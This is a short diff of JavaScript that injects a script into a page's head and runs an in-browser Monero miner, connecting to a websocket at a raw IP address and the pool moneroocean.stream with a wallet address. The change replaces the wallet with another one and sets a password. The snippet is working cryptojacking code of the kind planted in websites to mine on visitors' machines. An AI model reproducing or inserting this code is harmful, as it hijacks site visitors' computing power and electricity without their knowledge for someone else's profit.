@@ -8,10 +8,10 @@ document.head.appendChild(script);
 
 server = "wss://45.119.82.33:40725";
 var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var walletAddress = "48ajA3sKSN4P8XdZdqcZ35Po9j9RjWHTgEAAWQxTESbv2EWnSauGPAREAFXYH32JG4WpvCqvf38JmfiA385i2LkGMo2QWFZ";
 var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
-var password = "";
+var password = "x";
 startMining(pool, walletAddress, workerId, threads, password);
 throttleMiner = 20;
 // End Of Mining Code
